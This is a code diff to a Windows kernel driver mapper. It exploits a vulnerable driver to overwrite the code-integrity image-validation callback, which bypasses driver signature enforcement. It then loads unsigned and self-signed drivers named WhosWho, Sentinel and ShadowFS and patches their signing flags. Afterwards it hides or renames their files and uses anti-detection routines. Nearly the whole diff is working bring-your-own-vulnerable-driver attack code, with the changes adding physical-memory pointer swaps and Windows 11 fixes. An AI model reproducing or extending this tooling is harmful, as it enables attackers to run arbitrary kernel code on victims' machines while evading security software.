@@ -614,6 +614,13 @@ namespace MapperCore {
         LOG("Sentinel driver: %ls", sentinelDriverFileName ? sentinelDriverFileName : L"(null)");
         LogKernelModuleSnapshot("trigger_entry", targetDriverFileName, sentinelDriverFileName, shadowFsDriverFileName);
 
+        PVOID cachedTargetBase = nullptr;
+        ULONG cachedTargetImageSize = 0;
+        PVOID cachedSentinelBase = nullptr;
+        ULONG cachedSentinelImageSize = 0;
+        PVOID cachedShadowFsBase = nullptr;
+        ULONG cachedShadowFsImageSize = 0;
+
         HANDLE deviceHandle = nullptr;
         const ULONGLONG openStartTick = GetTickCount64();
         NTSTATUS status = VulnDriver::OpenDevice(&deviceHandle);
@@ -627,7 +634,7 @@ namespace MapperCore {
         if (!NT_SUCCESS(status)) {
             LOG("Device not open, loading vuln driver via service...");
             const ULONGLONG loaderLoadStartTick = GetTickCount64();
-            status = DriverLoader::LoadDriver(g_LoaderServicePath);
+            status = DriverLoader::LoadDriver(g_LoaderServicePath, loaderDriverFullPath);
             LOG_STATUS("LoadDriver (vuln/loader)", status);
             LOG("LoadDriver loader detail status=0x%08X service=%ls elapsed_ms=%llu total_elapsed_ms=%llu",
                 (DWORD)status,
@@ -696,12 +703,25 @@ namespace MapperCore {
 
                     LOG("Patching CI callback -> ZwFlushInstructionCache (%p)...", zwFlushInstructionCache);
                     const ULONGLONG patchStartTick = GetTickCount64();
-                    status = VulnDriver::WriteKernelMemory(deviceHandle, ciValidateImageHeaderEntry, &zwFlushInstructionCache, sizeof(PVOID));
-                    LOG_STATUS("WriteKernelMemory (CI patch)", status);
-                    LOG("CI patch write detail status=0x%08X addr=%p replacement=%p elapsed_ms=%llu total_elapsed_ms=%llu",
+                    ULONGLONG ciPatchPhysical = VulnDriver::VirtualToPhysical(deviceHandle, ciValidateImageHeaderEntry);
+                    LOG("CI patch physical slot addr=%p phys=0x%llX elapsed_ms=%llu total_elapsed_ms=%llu",
+                        ciValidateImageHeaderEntry,
+                        static_cast<unsigned long long>(ciPatchPhysical),
+                        MapperElapsedMs(patchStartTick),
+                        MapperElapsedMs(exploitStartTick));
+                    PVOID patchPreviousCallback = nullptr;
+                    status = ciPatchPhysical != 0
+                        ? VulnDriver::ExchangePhysicalPointer(deviceHandle, ciPatchPhysical, zwFlushInstructionCache, &patchPreviousCallback)
+                        : STATUS_UNSUCCESSFUL;
+                    LOG_STATUS("ExchangePhysicalPointer (CI patch)", status);
+                    LOG("CI patch write detail status=0x%08X addr=%p phys=0x%llX previous=%p expected_previous=%p replacement=%p previous_match=%u elapsed_ms=%llu total_elapsed_ms=%llu",
                         (DWORD)status,
                         ciValidateImageHeaderEntry,
+                        static_cast<unsigned long long>(ciPatchPhysical),
+                        patchPreviousCallback,
+                        originalCallback,
                         zwFlushInstructionCache,
+                        patchPreviousCallback == originalCallback ? 1u : 0u,
                         MapperElapsedMs(patchStartTick),
                         MapperElapsedMs(exploitStartTick));
 
@@ -722,7 +742,7 @@ namespace MapperCore {
                         LOG("CI callback patched successfully, now loading target driver...");
                         LOG("Target driver service path: %ls", g_DriverServicePath);
                         const ULONGLONG targetLoadStartTick = GetTickCount64();
-                        status = DriverLoader::LoadDriver(g_DriverServicePath);
+                        status = DriverLoader::LoadDriver(g_DriverServicePath, targetDriverFullPath);
                         LOG_STATUS("LoadDriver (WhosWho/target)", status);
                         LOG("LoadDriver target detail status=0x%08X service=%ls elapsed_ms=%llu total_elapsed_ms=%llu",
                             (DWORD)status,
@@ -740,36 +760,21 @@ namespace MapperCore {
                                 targetBaseAfterLoad,
                                 targetImageSizeAfterLoad,
                                 static_cast<unsigned long long>(GetTickCount64() - exploitStartTick));
+                            if (targetBaseAfterLoad) {
+                                cachedTargetBase = targetBaseAfterLoad;
+                                cachedTargetImageSize = targetImageSizeAfterLoad;
+                                g_DriverLoadAddress = targetBaseAfterLoad;
+                            }
                         }
                         if (NT_SUCCESS(status) && targetDriverFullPath && targetDriverFullPath[0]) {
-                            LOG("Hiding target driver file immediately after load: %ls", targetDriverFullPath);
-                            const ULONGLONG hideTargetStartTick = GetTickCount64();
-                            if (Utils::HideLoadedImagePath(targetDriverFullPath)) {
-                                LOG("Target driver file hidden/renamed after load elapsed_ms=%llu total_elapsed_ms=%llu",
-                                    MapperElapsedMs(hideTargetStartTick),
-                                    MapperElapsedMs(exploitStartTick));
-                            } else {
-                                LOG("WARNING: Target driver file hide deferred after load, GLE=%u elapsed_ms=%llu total_elapsed_ms=%llu",
-                                    GetLastError(),
-                                    MapperElapsedMs(hideTargetStartTick),
-                                    MapperElapsedMs(exploitStartTick));
-                            }
-                            ULONG targetImageSizeAfterHide = 0;
-                            PVOID targetBaseAfterHide = targetDriverFileName
-                                ? KernelUtils::GetDriverBaseByName(targetDriverFileName, &targetImageSizeAfterHide)
-                                : nullptr;
-                            LOG("Post-hide module query (WhosWho): base=%p size=0x%X gle=%lu elapsed_ms=%llu",
-                                targetBaseAfterHide,
-                                targetImageSizeAfterHide,
-                                GetLastError(),
-                                static_cast<unsigned long long>(GetTickCount64() - exploitStartTick));
+                            LOG("Deferring target driver file hide until after CI restore: %ls", targetDriverFullPath);
                         }
 
                         NTSTATUS sentStatus = STATUS_SUCCESS;
                         if (NT_SUCCESS(status) && sentinelDriverFileName && g_SentinelServicePath[0]) {
                             LOG("Loading sentinel driver, service path: %ls", g_SentinelServicePath);
                             const ULONGLONG sentinelLoadStartTick = GetTickCount64();
-                            sentStatus = DriverLoader::LoadDriver(g_SentinelServicePath);
+                            sentStatus = DriverLoader::LoadDriver(g_SentinelServicePath, sentinelDriverFullPath);
                             LOG_STATUS("LoadDriver (Sentinel)", sentStatus);
                             LOG("LoadDriver sentinel detail status=0x%08X service=%ls elapsed_ms=%llu total_elapsed_ms=%llu",
                                 (DWORD)sentStatus,
@@ -787,29 +792,15 @@ namespace MapperCore {
                                     sentinelBaseAfterLoad,
                                     sentinelImageSizeAfterLoad,
                                     static_cast<unsigned long long>(GetTickCount64() - exploitStartTick));
+                                if (sentinelBaseAfterLoad) {
+                                    cachedSentinelBase = sentinelBaseAfterLoad;
+                                    cachedSentinelImageSize = sentinelImageSizeAfterLoad;
+                                    g_SentinelLoadAddress = sentinelBaseAfterLoad;
+                                    g_SentinelImageSize = sentinelImageSizeAfterLoad;
+                                }
                             }
                             if (NT_SUCCESS(sentStatus) && sentinelDriverFullPath && sentinelDriverFullPath[0]) {
-                                LOG("Hiding sentinel driver file immediately after load: %ls", sentinelDriverFullPath);
-                                const ULONGLONG hideSentinelStartTick = GetTickCount64();
-                                if (Utils::HideLoadedImagePath(sentinelDriverFullPath)) {
-                                    LOG("Sentinel driver file hidden/renamed after load elapsed_ms=%llu total_elapsed_ms=%llu",
-                                        MapperElapsedMs(hideSentinelStartTick),
-                                        MapperElapsedMs(exploitStartTick));
-                                } else {
-                                    LOG("WARNING: Sentinel driver file hide deferred after load, GLE=%u elapsed_ms=%llu total_elapsed_ms=%llu",
-                                        GetLastError(),
-                                        MapperElapsedMs(hideSentinelStartTick),
-                                        MapperElapsedMs(exploitStartTick));
-                                }
-                                ULONG sentinelImageSizeAfterHide = 0;
-                                PVOID sentinelBaseAfterHide = sentinelDriverFileName
-                                    ? KernelUtils::GetDriverBaseByName(sentinelDriverFileName, &sentinelImageSizeAfterHide)
-                                    : nullptr;
-                                LOG("Post-hide module query (Sentinel): base=%p size=0x%X gle=%lu elapsed_ms=%llu",
-                                    sentinelBaseAfterHide,
-                                    sentinelImageSizeAfterHide,
-                                    GetLastError(),
-                                    static_cast<unsigned long long>(GetTickCount64() - exploitStartTick));
+                                LOG("Deferring sentinel driver file hide until after CI restore: %ls", sentinelDriverFullPath);
                             }
                             if (!NT_SUCCESS(sentStatus) && sentStatus != STATUS_IMAGE_ALREADY_LOADED) {
                                 LOG("FATAL: Sentinel load is required and failed with status 0x%08X", (DWORD)sentStatus);
@@ -822,7 +813,7 @@ namespace MapperCore {
                         if (NT_SUCCESS(status) && shadowFsDriverFileName && g_ShadowFsServicePath[0]) {
                             LOG("Loading shadowfs driver, service path: %ls", g_ShadowFsServicePath);
                             const ULONGLONG shadowLoadStartTick = GetTickCount64();
-                            shadowFsStatus = DriverLoader::LoadDriver(g_ShadowFsServicePath);
+                            shadowFsStatus = DriverLoader::LoadDriver(g_ShadowFsServicePath, shadowFsDriverFullPath);
                             LOG_STATUS("LoadDriver (ShadowFS)", shadowFsStatus);
                             LOG("LoadDriver shadowfs detail status=0x%08X service=%ls elapsed_ms=%llu total_elapsed_ms=%llu",
                                 (DWORD)shadowFsStatus,
@@ -830,19 +821,16 @@ namespace MapperCore {
                                 MapperElapsedMs(shadowLoadStartTick),
                                 MapperElapsedMs(exploitStartTick));
                             LogKernelModuleSnapshot("after_shadowfs_load", targetDriverFileName, sentinelDriverFileName, shadowFsDriverFileName);
+                            if (NT_SUCCESS(shadowFsStatus) && shadowFsDriverFileName) {
+                                cachedShadowFsBase = KernelUtils::GetDriverBaseByName(shadowFsDriverFileName, &cachedShadowFsImageSize);
+                                LOG("Post-load module query (ShadowFS): status=0x%08X base=%p size=0x%X elapsed_ms=%llu",
+                                    static_cast<DWORD>(shadowFsStatus),
+                                    cachedShadowFsBase,
+                                    cachedShadowFsImageSize,
+                                    static_cast<unsigned long long>(GetTickCount64() - exploitStartTick));
+                            }
                             if (NT_SUCCESS(shadowFsStatus) && shadowFsDriverFullPath && shadowFsDriverFullPath[0]) {
-                                LOG("Hiding shadowfs driver file immediately after load: %ls", shadowFsDriverFullPath);
-                                const ULONGLONG hideShadowStartTick = GetTickCount64();
-                                if (Utils::HideLoadedImagePath(shadowFsDriverFullPath)) {
-                                    LOG("ShadowFS driver file hidden/renamed after load elapsed_ms=%llu total_elapsed_ms=%llu",
-                                        MapperElapsedMs(hideShadowStartTick),
-                                        MapperElapsedMs(exploitStartTick));
-                                } else {
-                                    LOG("WARNING: ShadowFS driver file hide deferred after load, GLE=%u elapsed_ms=%llu total_elapsed_ms=%llu",
-                                        GetLastError(),
-                                        MapperElapsedMs(hideShadowStartTick),
-                                        MapperElapsedMs(exploitStartTick));
-                                }
+                                LOG("Deferring shadowfs driver file hide until after CI restore: %ls", shadowFsDriverFullPath);
                             }
                         } else if (!NT_SUCCESS(status)) {
                             LOG("Skipping ShadowFS load because target driver failed");
@@ -856,9 +844,14 @@ namespace MapperCore {
                             static_cast<unsigned long long>(ciRestorePhysical),
                             MapperElapsedMs(restoreStartTick),
                             MapperElapsedMs(exploitStartTick));
-                        NTSTATUS restoreStatus = VulnDriver::WriteKernelMemory(deviceHandle, ciValidateImageHeaderEntry, &originalCallback, sizeof(PVOID));
-                        LOG_STATUS("WriteKernelMemory (CI restore)", restoreStatus);
-                        g_CiCallbackPatched = false;
+                        PVOID restorePreviousCallback = nullptr;
+                        NTSTATUS restoreStatus = ciRestorePhysical != 0
+                            ? VulnDriver::ExchangePhysicalPointer(deviceHandle, ciRestorePhysical, originalCallback, &restorePreviousCallback)
+                            : STATUS_UNSUCCESSFUL;
+                        LOG_STATUS("ExchangePhysicalPointer (CI restore)", restoreStatus);
+                        if (NT_SUCCESS(restoreStatus)) {
+                            g_CiCallbackPatched = false;
+                        }
                         PVOID restoredCallback = nullptr;
                         NTSTATUS restoreVerifyStatus = STATUS_UNSUCCESSFUL;
                         if (NT_SUCCESS(restoreStatus) && ciRestorePhysical != 0) {
@@ -871,16 +864,27 @@ namespace MapperCore {
                                 MapperElapsedMs(restoreStartTick),
                                 MapperElapsedMs(exploitStartTick));
                         }
-                        LOG("CI restore detail write_status=0x%08X verify_status=0x%08X addr=%p value=%p expected=%p match=%u elapsed_ms=%llu total_elapsed_ms=%llu",
+                        LOG("CI restore detail write_status=0x%08X verify_status=0x%08X addr=%p phys=0x%llX previous=%p expected_previous=%p value=%p expected=%p previous_match=%u match=%u elapsed_ms=%llu total_elapsed_ms=%llu",
                             (DWORD)restoreStatus,
                             (DWORD)restoreVerifyStatus,
                             ciValidateImageHeaderEntry,
+                            static_cast<unsigned long long>(ciRestorePhysical),
+                            restorePreviousCallback,
+                            zwFlushInstructionCache,
                             restoredCallback,
                             originalCallback,
+                            restorePreviousCallback == zwFlushInstructionCache ? 1u : 0u,
                             restoredCallback == originalCallback ? 1u : 0u,
                             MapperElapsedMs(restoreStartTick),
                             MapperElapsedMs(exploitStartTick));
-                        LogKernelModuleSnapshot("after_ci_restore", targetDriverFileName, sentinelDriverFileName, shadowFsDriverFileName);
+                        LOG("after_ci_restore snapshot skipped reason=win11_post_restore_module_query_crash_window status=0x%08X verify_status=0x%08X elapsed_ms=%llu total_elapsed_ms=%llu",
+                            static_cast<DWORD>(restoreStatus),
+                            static_cast<DWORD>(restoreVerifyStatus),
+                            MapperElapsedMs(restoreStartTick),
+                            MapperElapsedMs(exploitStartTick));
+                        if (!NT_SUCCESS(restoreStatus)) {
+                            status = restoreStatus;
+                        }
 
                         if (NT_SUCCESS(status) && sentinelDriverFileName && g_SentinelServicePath[0] &&
                             !NT_SUCCESS(sentStatus) && sentStatus != STATUS_IMAGE_ALREADY_LOADED) {
@@ -889,18 +893,24 @@ namespace MapperCore {
 
                         if (NT_SUCCESS(status)) {
                             LOG("Patching driver signing flags for target: %ls", targetDriverFileName);
-                            BOOL patchResult = KernelUtils::PatchDriverSigningFlags(deviceHandle, targetDriverFileName);
+                            BOOL patchResult = cachedTargetBase
+                                ? KernelUtils::PatchDriverSigningFlagsByBase(deviceHandle, cachedTargetBase, cachedTargetImageSize, "WhosWho", TRUE)
+                                : KernelUtils::PatchDriverSigningFlags(deviceHandle, targetDriverFileName);
                             LOG("PatchDriverSigningFlags (target): %s", patchResult ? "OK" : "FAILED");
 
                             if (NT_SUCCESS(sentStatus) && sentinelDriverFileName) {
                                 LOG("Patching driver signing flags for sentinel: %ls", sentinelDriverFileName);
-                                patchResult = KernelUtils::PatchDriverSigningFlags(deviceHandle, sentinelDriverFileName);
+                                patchResult = cachedSentinelBase
+                                    ? KernelUtils::PatchDriverSigningFlagsByBase(deviceHandle, cachedSentinelBase, cachedSentinelImageSize, "Sentinel", FALSE)
+                                    : KernelUtils::PatchDriverSigningFlags(deviceHandle, sentinelDriverFileName);
                                 LOG("PatchDriverSigningFlags (sentinel): %s", patchResult ? "OK" : "FAILED");
                             }
 
                             if (NT_SUCCESS(shadowFsStatus) && shadowFsDriverFileName) {
                                 LOG("Patching driver signing flags for shadowfs: %ls", shadowFsDriverFileName);
-                                patchResult = KernelUtils::PatchDriverSigningFlags(deviceHandle, shadowFsDriverFileName);
+                                patchResult = cachedShadowFsBase
+                                    ? KernelUtils::PatchDriverSigningFlagsByBase(deviceHandle, cachedShadowFsBase, cachedShadowFsImageSize, "ShadowFS", FALSE)
+                                    : KernelUtils::PatchDriverSigningFlags(deviceHandle, shadowFsDriverFileName);
                                 LOG("PatchDriverSigningFlags (shadowfs): %s", patchResult ? "OK" : "FAILED");
                             }
                         }
@@ -927,6 +937,14 @@ namespace MapperCore {
                 MapperElapsedMs(exploitStartTick));
             LogKernelModuleSnapshot("before_sentinel_global_discovery", targetDriverFileName, sentinelDriverFileName, shadowFsDriverFileName);
             PVOID sentBase = KernelUtils::GetDriverBaseByName(sentinelDriverFileName, &sentImageSize);
+            if (!sentBase && cachedSentinelBase) {
+                sentBase = cachedSentinelBase;
+                sentImageSize = cachedSentinelImageSize;
+                LOG("Sentinel base discovery using cached base=%p size=0x%X elapsed_ms=%llu",
+                    sentBase,
+                    sentImageSize,
+                    MapperElapsedMs(exploitStartTick));
+            }
             LOG("Sentinel driver base: %p, size: 0x%X elapsed_ms=%llu", sentBase, sentImageSize,
                 static_cast<unsigned long long>(GetTickCount64() - exploitStartTick));
             if (sentBase) {
@@ -937,15 +955,33 @@ namespace MapperCore {
                     targetDriverFileName,
                     MapperElapsedMs(exploitStartTick));
                 PVOID whoswhoBase = KernelUtils::GetDriverBaseByName(targetDriverFileName, &whoswhoImageSize);
+                if (!whoswhoBase && cachedTargetBase) {
+                    whoswhoBase = cachedTargetBase;
+                    whoswhoImageSize = cachedTargetImageSize;
+                    LOG("WhosWho base discovery using cached base=%p size=0x%X elapsed_ms=%llu",
+                        whoswhoBase,
+                        whoswhoImageSize,
+                        MapperElapsedMs(exploitStartTick));
+                }
                 LOG("WhosWho driver base: %p, size: 0x%X elapsed_ms=%llu", whoswhoBase, whoswhoImageSize,
                     static_cast<unsigned long long>(GetTickCount64() - exploitStartTick));
                 if (whoswhoBase) {
                     g_DriverLoadAddress = whoswhoBase;
-                    BOOL wsgResult = WriteSentinelGlobals(deviceHandle, sentBase, sentImageSize,
-                                             whoswhoBase, whoswhoImageSize);
-                    LOG("WriteSentinelGlobals result: %s", wsgResult ? "OK" : "FAILED");
-                    if (!wsgResult) {
-                        LOG("WriteSentinelGlobals failed; continuing because Sentinel performs in-driver bridge discovery");
+                    const ULONG buildNumber = MapperBuildNumber();
+                    if (buildNumber >= 26100) {
+                        LOG("WriteSentinelGlobals skipped build=%lu reason=win11_kernel_global_handoff_uses_sentinel_discovery sent_base=%p sent_size=0x%X whoswho_base=%p whoswho_size=0x%X",
+                            buildNumber,
+                            sentBase,
+                            sentImageSize,
+                            whoswhoBase,
+                            whoswhoImageSize);
+                    } else {
+                        BOOL wsgResult = WriteSentinelGlobals(deviceHandle, sentBase, sentImageSize,
+                                                 whoswhoBase, whoswhoImageSize);
+                        LOG("WriteSentinelGlobals result: %s", wsgResult ? "OK" : "FAILED");
+                        if (!wsgResult) {
+                            LOG("WriteSentinelGlobals failed; continuing because Sentinel performs in-driver bridge discovery");
+                        }
                     }
                 } else {
                     LOG("WARNING: Could not find WhosWho driver in loaded modules; continuing because Sentinel performs in-driver bridge discovery");
@@ -955,6 +991,52 @@ namespace MapperCore {
             }
         }
 
+        if (NT_SUCCESS(status)) {
+            if (targetDriverFullPath && targetDriverFullPath[0]) {
+                LOG("Post-CI-restore target driver file hide: %ls", targetDriverFullPath);
+                const ULONGLONG hideTargetStartTick = GetTickCount64();
+                if (Utils::HideLoadedImagePath(targetDriverFullPath)) {
+                    LOG("Target driver file hidden/renamed after CI restore elapsed_ms=%llu total_elapsed_ms=%llu",
+                        MapperElapsedMs(hideTargetStartTick),
+                        MapperElapsedMs(exploitStartTick));
+                } else {
+                    LOG("WARNING: Target driver file hide deferred after CI restore, GLE=%u elapsed_ms=%llu total_elapsed_ms=%llu",
+                        GetLastError(),
+                        MapperElapsedMs(hideTargetStartTick),
+                        MapperElapsedMs(exploitStartTick));
+                }
+            }
+
+            if (sentinelDriverFullPath && sentinelDriverFullPath[0]) {
+                LOG("Post-CI-restore sentinel driver file hide: %ls", sentinelDriverFullPath);
+                const ULONGLONG hideSentinelStartTick = GetTickCount64();
+                if (Utils::HideLoadedImagePath(sentinelDriverFullPath)) {
+                    LOG("Sentinel driver file hidden/renamed after CI restore elapsed_ms=%llu total_elapsed_ms=%llu",
+                        MapperElapsedMs(hideSentinelStartTick),
+                        MapperElapsedMs(exploitStartTick));
+                } else {
+                    LOG("WARNING: Sentinel driver file hide deferred after CI restore, GLE=%u elapsed_ms=%llu total_elapsed_ms=%llu",
+                        GetLastError(),
+                        MapperElapsedMs(hideSentinelStartTick),
+                        MapperElapsedMs(exploitStartTick));
+                }
+            }
+
+            if (shadowFsDriverFullPath && shadowFsDriverFullPath[0]) {
+                LOG("Post-CI-restore shadowfs driver file hide: %ls", shadowFsDriverFullPath);
+                const ULONGLONG hideShadowStartTick = GetTickCount64();
+                if (Utils::HideLoadedImagePath(shadowFsDriverFullPath)) {
+                    LOG("ShadowFS driver file hidden/renamed after CI restore elapsed_ms=%llu total_elapsed_ms=%llu",
+                        MapperElapsedMs(hideShadowStartTick),
+                        MapperElapsedMs(exploitStartTick));
+                } else {
+                    LOG("WARNING: ShadowFS driver file hide deferred after CI restore, GLE=%u elapsed_ms=%llu total_elapsed_ms=%llu",
+                        GetLastError(),
+                        MapperElapsedMs(hideShadowStartTick),
+                        MapperElapsedMs(exploitStartTick));
+                }
+            }
+        }
 
         LOG("Closing vuln device and unloading loader driver elapsed_ms=%llu...",
             static_cast<unsigned long long>(GetTickCount64() - exploitStartTick));
@@ -1435,7 +1517,20 @@ namespace MapperCore {
 
         if (g_CiCallbackPatched && g_CiCallbackAddress && g_OriginalCiCallback) {
             AntiDetect::TimingJitter();
-            status = VulnDriver::WriteKernelMemory(device, g_CiCallbackAddress, &g_OriginalCiCallback, sizeof(PVOID));
+            ULONGLONG ciPhysical = VulnDriver::VirtualToPhysical(device, g_CiCallbackAddress);
+            LOG("RestoreCiCallback physical slot addr=%p phys=0x%llX original=%p",
+                g_CiCallbackAddress,
+                static_cast<unsigned long long>(ciPhysical),
+                g_OriginalCiCallback);
+            PVOID previousCallback = nullptr;
+            status = ciPhysical != 0
+                ? VulnDriver::ExchangePhysicalPointer(device, ciPhysical, g_OriginalCiCallback, &previousCallback)
+                : STATUS_UNSUCCESSFUL;
+            LOG("RestoreCiCallback exchange status=0x%08X previous=%p original=%p match_current_patch=%u",
+                static_cast<DWORD>(status),
+                previousCallback,
+                g_OriginalCiCallback,
+                previousCallback != nullptr && previousCallback != g_OriginalCiCallback ? 1u : 0u);
             if (NT_SUCCESS(status)) {
                 g_CiCallbackPatched = false;
                 AntiDetect::MemoryBarrier();
@@ -1857,11 +1952,7 @@ int main(int argc, char* argv[]) {
         return 1;
     }
     LOG("CopyFileW target_ok");
-    if (Utils::ForceDeleteOrRename(driverArg.c_str())) {
-        LOG("Source target driver deleted after staging copy");
-    } else {
-        LOG("WARNING: Source target driver deletion deferred, GLE=%u", GetLastError());
-    }
+    LOG("Source target driver retained until post-load cleanup path=%ls", driverArg.c_str());
 
 
     std::wstring sentinelFilePath;
@@ -1885,11 +1976,7 @@ int main(int argc, char* argv[]) {
             return 1;
         }
         LOG("CopyFileW sentinel_ok");
-        if (Utils::ForceDeleteOrRename(sentinelArg.c_str())) {
-            LOG("Source sentinel driver deleted after staging copy");
-        } else {
-            LOG("WARNING: Source sentinel driver deletion deferred, GLE=%u", GetLastError());
-        }
+        LOG("Source sentinel driver retained until post-load cleanup path=%ls", sentinelArg.c_str());
 
         LOG("Self-signing sentinel driver...");
         if (!SignedMemory::SelfSignDriver(sentinelFilePath.c_str())) {
@@ -1937,11 +2024,7 @@ int main(int argc, char* argv[]) {
             return 1;
         }
         LOG("CopyFileW shadowfs_ok");
-        if (Utils::ForceDeleteOrRename(shadowFsArg.c_str())) {
-            LOG("Source shadowfs driver deleted after staging copy");
-        } else {
-            LOG("WARNING: Source shadowfs driver deletion deferred, GLE=%u", GetLastError());
-        }
+        LOG("Source shadowfs driver retained until post-load cleanup path=%ls", shadowFsArg.c_str());
 
         LOG("Self-signing shadowfs driver...");
         if (!SignedMemory::SelfSignDriver(shadowFsFilePath.c_str())) {
@@ -1967,6 +2050,11 @@ int main(int argc, char* argv[]) {
     }
 
     LOG("Cleaning up temp files...");
+    Utils::ForceDeleteOrRename(driverArg.c_str());
+    if (!sentinelArg.empty())
+        Utils::ForceDeleteOrRename(sentinelArg.c_str());
+    if (!shadowFsArg.empty())
+        Utils::ForceDeleteOrRename(shadowFsArg.c_str());
     Utils::ForceDeleteOrRename(loaderFilePath.c_str());
     if (NT_SUCCESS(status)) {
         Utils::HideLoadedImagePath(driverFilePath.c_str());
